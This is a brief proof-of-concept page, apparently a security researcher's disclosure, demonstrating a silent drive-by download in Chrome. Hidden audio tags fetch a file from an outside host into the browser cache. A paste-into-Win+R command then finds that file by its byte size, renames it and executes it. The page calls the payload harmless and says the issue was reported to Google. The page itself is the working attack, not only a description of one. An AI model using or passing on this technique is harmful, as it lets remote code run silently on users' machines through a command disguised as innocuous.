Don't run commands you don't really understand

This demonstrates a fully silent drive-by download in Google Chrome -
  and will launch a demo PoC if you dare to paste this seemingly harmless command in a Win+R prompt:

<pre>
cmd /c for /r %g in (*_*) do if %~zg==23456 copy /y "%g" "%g.log" & "%g.log"
</pre>

<audio style=visibility:hidden src=http://trax.x10.mx/cybersweet2b.au />
<audio style=visibility:hidden src=http://trax.x10.mx/cybersweet2b.au />

Notes: 
 * The PoC is a harmless demo
 * Chiptune in PoC is (c) 1999 WAVE
 * Reported to Google in November 2015 - status: Wontfix
